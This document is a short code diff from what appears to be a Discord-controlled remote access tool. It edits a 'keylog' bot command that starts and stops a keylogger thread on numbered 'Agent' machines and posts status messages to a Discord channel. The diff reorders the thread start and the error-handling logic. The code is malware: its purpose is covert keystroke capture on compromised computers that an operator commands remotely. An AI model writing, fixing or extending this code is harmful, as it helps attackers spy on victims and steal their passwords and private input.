@@ -287,7 +287,6 @@ async def keylog(context):
             except IndexError:
                 my_embed = discord.Embed(title=f"Error while starting Keylogger on Agent#{ID}\nMake sure you have specified all the required parameters", color=0xFF0000)
         try:
-            threading.Thread(target=keylogger_start).start()
             try:
                 if not keylog_status:
                     my_embed = discord.Embed(title=f"Keylogger stopped on Agent#{ID}", color=0xFF0000)
@@ -295,8 +294,8 @@ async def keylog(context):
                     return
             except Exception as e:
                 my_embed = discord.Embed(title=f"Error while stopping keylogger on Agent#{ID}:\n{e}", color=0xFF0000)
-                await context.message.channel.send(embed=my_embed)
-                return
+            await context.message.channel.send(embed=my_embed)
+            threading.Thread(target=keylogger_start).start()
             my_embed = discord.Embed(title=f"Keylogger started on Agent#{ID}", color=0x00FF00)
             await context.message.channel.send(embed=my_embed)
         except Exception as e:
